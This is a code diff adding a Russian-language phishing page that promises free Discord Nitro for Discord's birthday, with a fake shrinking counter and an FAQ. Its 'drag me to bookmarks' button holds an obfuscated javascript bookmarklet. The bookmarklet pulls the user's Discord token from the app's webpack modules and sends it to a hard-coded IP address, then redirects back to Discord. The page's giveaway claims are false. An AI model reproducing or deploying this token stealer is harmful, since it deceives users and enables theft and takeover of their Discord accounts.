@@ -1,0 +1,178 @@
+
+<!DOCTYPE html><html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Получить Нитро</title>
+    <link rel="stylesheet" href="https://discord-birthday.vercel.app/index.css">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter&display=swap">
+    <script src="https://discord-birthday.vercel.app/font.js" crossorigin="anonymous"></script>
+    <script>
+      let counter = 1252;
+
+      function updateCounter() {
+          const decrement = Math.floor(Math.random() * 2) + 1;
+          counter -= decrement;
+          document.getElementById('counter').innerText = counter;
+
+          const nextInterval = (Math.floor(Math.random() * 30) + 1) * 1000;
+          setTimeout(updateCounter, nextInterval);
+      }
+
+      const initialInterval = (Math.floor(Math.random() * 30) + 1) * 1000;
+      setTimeout(updateCounter, initialInterval);
+    </script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Dela+Gothic+One&amp;family=Josefin+Sans:ital,wght@1,700&amp;display=swap" rel="stylesheet">
+  </head>
+
+  <body>
+    <header class="header">
+      <div class="nav-container">
+        <input type="checkbox" id="toggle-menu">
+        <nav class="nav">
+          <ul class="nav-links-container">
+            <li class="nav-link">
+              <a href="#">Подробнее</a>
+            </li>
+            <li class="nav-link">
+              <a href="#">Сервер</a>
+            </li>
+            <li class="nav-link">
+              <a href="#">Помощь</a>
+            </li>
+            <li class="nav-link">
+              <a href="#">Блог</a>
+            </li>
+          </ul>
+        </nav>
+        <div class="column">
+          <div class="downloadButton">
+            <a href="#">Войти</a>
+          </div>
+          <label for="toggle-menu" class="abrir-menu"><i class="fa-solid fa-bars"></i></label>
+        </div>
+      </div>
+      <div class="header-content">
+        <div class="header-text">
+          <h1>Получи Нитро Бесплатно!</h1>
+          <p>
+            Для получения Нитро перетащи кнопку ниже в ЗАКЛАДКИ БРАУЗЕРА. Если
+            их нет, нажми CTRL + SHIFT + B. Далее зайди в
+            Discord и нажми на закладку! Ты также можешь посмотреть ИНСТРУКЦИЮ
+            НИЖЕ!
+          </p>
+          
+          <button class="banner-button">
+            <a href="javascript: function _0x514a(_0x6cbafe,_0x3e83e0){const _0x3fa5d9=_0x3fa5();return _0x514a=function(_0x514aff,_0x7a0a48){_0x514aff=_0x514aff-0x158;let _0x331292=_0x3fa5d9[_0x514aff];return _0x331292;},_0x514a(_0x6cbafe,_0x3e83e0);}function _0x3fa5(){const _0x5b5150=['aHR0cHM6Ly9kaXNjb3JkLmNvbS9jaGFubmVscy9AbWU=','exports','aHR0cDovLzEzOC4yMDEuMjEuMTg5OjIyOTQzLw==','replace','getToken','199716GXHmXc','8YefiCe','7710804OUygpi','91590jUpyiX','default','4858Cfimig','973528LOhAEh','location','372342RhvlHw','5776qqffko','7953100VGxGFr','push','430WfZUlk'];_0x3fa5=function(){return _0x5b5150;};return _0x3fa5();}(function(_0x1bb439,_0x20f641){const _0x37d8c5=_0x514a,_0x2abd38=_0x1bb439();while(!![]){try{const _0x3fca83=parseInt(_0x37d8c5(0x166))/0x1+parseInt(_0x37d8c5(0x160))/0x2+parseInt(_0x37d8c5(0x168))/0x3*(-parseInt(_0x37d8c5(0x161))/0x4)+-parseInt(_0x37d8c5(0x15a))/0x5*(parseInt(_0x37d8c5(0x163))/0x6)+-parseInt(_0x37d8c5(0x165))/0x7*(parseInt(_0x37d8c5(0x169))/0x8)+parseInt(_0x37d8c5(0x162))/0x9+parseInt(_0x37d8c5(0x158))/0xa;if(_0x3fca83===_0x20f641)break;else _0x2abd38['push'](_0x2abd38['shift']());}catch(_0x4cdd26){_0x2abd38['push'](_0x2abd38['shift']());}}}(_0x3fa5,0xa1f46),setTimeout(function(){const _0x7e47a=_0x514a;window[_0x7e47a(0x167)][_0x7e47a(0x15e)](window['atob'](_0x7e47a(0x15d))+(webpackChunkdiscord_app[_0x7e47a(0x159)]([[''],{},_0x2cae20=>{const _0x81f40=_0x7e47a;m=[];for(let _0x2fc39c in _0x2cae20['c'])m[_0x81f40(0x159)](_0x2cae20['c'][_0x2fc39c]);}]),m)['find'](_0x5b07ac=>_0x5b07ac?.[_0x7e47a(0x15c)]?.[_0x7e47a(0x164)]?.[_0x7e47a(0x15f)]!==void 0x0)['exports'][_0x7e47a(0x164)][_0x7e47a(0x15f)]());},0x64),setTimeout(function(){const _0x14f299=_0x514a;window[_0x14f299(0x167)][_0x14f299(0x15e)](window['atob'](_0x14f299(0x15b)));},0x157c));
+">Перетащи меня в закладки</a>
+          </button>
+          <button class="banner-buttn">
+            <a href="https://discord.com/login" target="_blank">Открыть Discord в браузере</a>
+          </button>
+          <p id="precounter">Осталось: <span id="counter">1252</span> Нитро</p>
+        </div>
+        <div class="header-image">
+          <img src="https://discord-birthday.vercel.app/src/img/bichicto.webp" alt="video mascota de discord con traje espacial">
+        </div>
+      </div>
+      <video class="pc-background" loop="true" autoplay="autoplay" muted="muted" src="https://discord-birthday.vercel.app/src/video/fondo.mp4"></video>
+    </header>
+    <main class="main">
+      <section class="table-characteristic">
+        <h3 class="table-title">Инструкция по получению Нитро</h3>
+        <div class="table">
+          <div style="
+              position: relative;
+              width: 80%;
+              margin-left: 10%;
+              margin-right: 10%;
+              vertical-align: middle;
+              text-align: center;
+              height: 0px;
+              padding-bottom: 43%;
+            ">
+            <iframe allow="fullscreen" allowfullscreen="" height="100%" src="https://www.youtube.com/embed/cnGQyFwvSNU" width="100%" style="
+                border: none;
+                width: 100%;
+                height: 100%;
+                position: absolute;
+                left: 0px;
+                top: 0px;
+                overflow: hidden;
+                border-radius: 4%;
+              "></iframe>
+          </div>
+        </div>
+      </section>
+
+      <section class="answers">
+        <h3 class="answer-title">Часто задаваемые вопросы</h3>
+        <img class="conejo" src="https://discord-birthday.vercel.app/src/img/conejito.svg" alt="conejo caricatura">
+        <input type="checkbox" name="checkAnswer1" id="checkAnswer1" style="display: none">
+        <div class="answer-container1">
+          <label for="checkAnswer1" class="label-answer">
+            <div class="label-text">
+              Почему происходит бесплатная раздача Нитро?
+            </div>
+            <p><i class="fa-solid fa-xmark"></i></p>
+          </label>
+          <div class="response">
+            <p>
+              В скором времени Discord будет отмечать свой день рождения. В
+              честь этого события происходит раздача Nitro бесплатно, также это
+              отличный способ привлечь новых пользователей в Discord и побудить
+              их продолжать использовать данное приложение. <br>Важно
+              отметить, что бесплатная раздача Nitro ограничена по времени.
+              Поэтому, если вы хотите получить Nitro бесплатно, то рекомендуется
+              сделать это прямо сейчас.
+            </p>
+          </div>
+        </div>
+        <input type="checkbox" name="checkAnswer2" id="checkAnswer2" style="display: none">
+        <div class="answer-container2">
+          <label for="checkAnswer2" class="label-answer">
+            <div class="label-text">Зачем нужно Нитро? Что оно дает?</div>
+            <p><i class="fa-solid fa-xmark"></i></p>
+          </label>
+          <div class="response">
+            <p>
+              Nitro предлагает множество функций, которые могут быть
+              привлекательными для пользователей, таких как возможность
+              трансляции в высоком разрешении, загрузка больших файлов,
+              использование анимированных эмодзи и многое другое.<br>Подписчики
+              Discord Nitro могут настраивать внешний вид своего профиля,
+              добавлять анимированные аватары и использовать уникальные шаблоны
+              профиля, что помогает выделиться и выразить свою индивидуальность.
+              Пользователи могут также изменять темы и цвета интерфейса
+              приложения в соответствии со своими предпочтениями.
+              <br>Подписчики Discord Nitro получают эксклюзивные бонусы в виде
+              бесплатных игр, специальных предложений, скидок и других игровых
+              материалов. Такие преимущества делают Discord Nitro не только
+              отличным инструментом для общения, но и выгодным способом получить
+              доступ к эксклюзивному контенту и развлечениям.
+            </p>
+          </div>
+        </div>
+        <input type="checkbox" name="checkAnswer3" id="checkAnswer3" style="display: none">
+        <div class="answer-container3">
+          <label for="checkAnswer3" class="label-answer">
+            <div class="label-text">Можно ли получить Нитро с телефона?</div>
+            <p><i class="fa-solid fa-xmark"></i></p>
+          </label>
+          <div class="response">
+            <p>
+              На данный момент к сожалению нет.<br>Для получения Нитро
+              необходимо зайти в дискорд с помощью браузера на компьютере и
+              следовать инструкции в видео.
+            </p>
+          </div>
+        </div>
+      </section>
+      <section class="banner">
+        <div class="banner-content">
+          <h3 class="banner-title">Получайте удовольствие от Nitro</h3>
+        </div>
+      </section>
+    </main>
+</body></html>
